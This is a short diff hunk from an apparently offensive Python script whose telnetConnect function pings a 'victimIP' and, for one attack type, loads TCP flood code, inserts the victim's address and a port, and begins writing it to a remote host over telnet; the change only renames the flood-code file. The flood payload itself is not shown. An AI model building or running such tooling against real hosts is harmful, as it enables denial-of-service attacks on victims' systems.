@@ -23,7 +23,7 @@ def telnetConnect(ip_address, victimIP, attackType):
                 output1 = t.execute('ping ' + victimIP)
                 print(output1)
             if attackType == 2:
-                str1 = open('tcp_flood_code', 'r').read()
+                str1 = open('tcp_flood_code.txt', 'r').read()
                 str1.replace('1.1.1.1', victimIP)
                 str1.replace('111111', '10001')
                 print(t.execute('touch code.py'))
